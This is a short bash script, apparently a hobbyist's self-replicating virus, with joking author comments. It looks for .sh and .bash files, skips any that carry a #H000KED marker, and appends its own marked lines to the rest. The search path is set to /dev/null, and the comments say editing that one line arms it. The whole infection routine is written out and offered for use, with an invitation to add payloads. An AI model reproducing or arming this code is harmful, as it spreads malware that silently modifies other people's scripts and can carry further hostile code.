#!/bin/bash
 # Harvie's ultimate bash worm ;P
 # This absolutely SUX, but -W0W- i've learned bash basix while writing it!
 # Protected against 31337-script-kiddies (edit-first-line)...
 # You can gzexe this script, but add the H000KED comment at end of some line...
 # Now it's just spreading, it's simple to add anything else...
 # Copyright = a+rwx; No warranty, responsibility, etc... ;D

for i in $( find /dev/null 2> /dev/null | grep -i "\.bash\$\|\.sh\$" ); do #H000KED
	if ( fgrep "\#H000KED" $i > /dev/null ); then
		echo Already infected: $i #Debug only
		continue #H000KED
	fi #H000KED
	echo >> $i #H000KED
	cat $0 | grep \#H000KED >> $i
	echo Newly infected: $i #Debug only
done #H000KED
